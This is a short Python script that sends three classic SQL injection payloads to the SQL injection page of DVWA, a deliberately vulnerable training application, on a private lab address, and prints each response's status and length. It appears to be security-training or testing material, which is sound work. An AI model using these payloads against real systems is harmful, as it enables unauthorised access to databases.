#!/usr/bin/env python3

import requests

URL = "http://192.168.1.5/dvwa/vulnerabilities/sqli/"

tests = {
    "LOW": "1' or '1'='1",
    "MEDIUM": "1 OR 1=1",
    "HIGH": "1e1",
}

session = requests.Session()


def test_sqli(level, payload):
    params = {
        "id": payload,
        "Submit": "Submit"
    }

    response = session.get(URL, params=params, timeout=10)

    print(f"\n[+] {level}")
    print(f"    Payload : {payload}")
    print(f"    URL     : {response.url}")
    print(f"    Status  : {response.status_code}")
    print(f"    Length  : {len(response.text)}")

    return response


def main():
    print("[*] DVWA SQL Injection Test")
    print("[*] Target:", URL)

    for level, payload in tests.items():
        test_sqli(level, payload)


if __name__ == "__main__":
    main()
